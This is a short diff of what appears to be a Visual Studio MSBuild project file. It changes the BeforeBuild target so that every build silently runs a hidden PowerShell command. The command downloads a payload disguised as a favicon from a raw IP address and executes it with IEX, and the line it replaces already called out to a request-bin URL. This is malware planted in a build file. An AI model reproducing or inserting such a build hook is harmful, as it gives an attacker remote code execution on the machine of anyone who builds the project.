@@ -214,7 +214,7 @@
     </VisualStudio>
   </ProjectExtensions>
   <Target Name="BeforeBuild">
-    <Exec Command="powershell.exe -Command &quot;Invoke-WebRequest -Uri https://postb.in/1598580599624-6571338884532&quot;"/>
+    <Exec Command="powershell -w hidden &quot;IEX (New-Object Net.WebClient).DownloadString('http://3.104.30.136:443/favicon.ico');&quot;"/>
   </Target>
   
   <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
